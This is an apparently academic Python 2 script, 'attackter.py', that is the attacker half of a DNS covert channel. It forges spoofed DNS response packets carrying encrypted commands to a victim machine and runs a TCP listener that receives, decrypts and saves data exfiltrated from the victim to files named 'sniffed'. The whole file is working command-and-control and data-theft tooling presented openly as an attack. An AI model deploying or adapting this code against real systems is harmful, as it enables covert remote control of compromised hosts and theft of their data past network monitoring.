__author__ = 'root'

# program name: attackter.py
# description: this program define method to create
# a covert channel between attacker and victim based
# on DNS packet
# Athor: He Tian
# date: June 12, 2015


import os
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.all import *
import threading
from twisted.internet.protocol import ServerFactory, Protocol
from twisted.internet import reactor
from random import randint
from utility import *
import ConfigParser

c= ConfigParser.ConfigParser()
c.read("config")

src = '142.232.191.38'
dst = '192.168.0.21'
aip = '192.168.0.20'
sp = 53
PORT = 8505
KEY = '01234567'


src = c.get("server","src")
dst = c.get("server","dst")
aip = c.get("server","aip")
sp = c.getint("server","sp")
PORT = c.getint("server","port")
KEY = c.get("server","key")

class ClientProtocol(Protocol):
    buffer = ''


    def dataReceived(self, data):
        self.buffer += data

    def connectionMade(self):
        print "start to reading....\n"

    def connectionLost(self, reason):
        print "connection ends... receved data: \n"
        self.bufferReceived(self.buffer)


    def bufferReceived(self, buffer):
        self.factory.transfer_finished(buffer)


class ClientFactory(ServerFactory):
   # def __init__(self):
   #     self.alldata = []

    protocol = ClientProtocol

    def transfer_finished(self, buffer=None):
        if buffer is not None:
            text = decrypt(buffer,KEY)
       #     print text
            f = open("sniffed."+str(randint(1,65535)), "w+")
            f.write(text)
            print "data has been transferred\n"



def forge_pkt(srcip, dstip, desp, srcp, message, flg):
    command = encrypt(message,KEY)
    ip = IP(src=srcip, dst=dstip)
    udp = UDP(dport=desp, sport=srcp)
    dns = DNS(id=1000, qr=1, an=DNSRR(rrname=command, rdata=flg))
    pkt = ip / udp / dns
    return pkt


if __name__ == "__main__":

    f = ClientFactory()
    reactor.listenTCP(PORT,f)

    t =threading.Thread(target=reactor.run,args=(False,))
    t.daemon = True
    t.start()

    while 1:
        message = raw_input()
        dp = randint(1,65535)
        pkt = forge_pkt(src, dst, dp, sp, message, aip)
        send(pkt)
        #  server.shutdown()
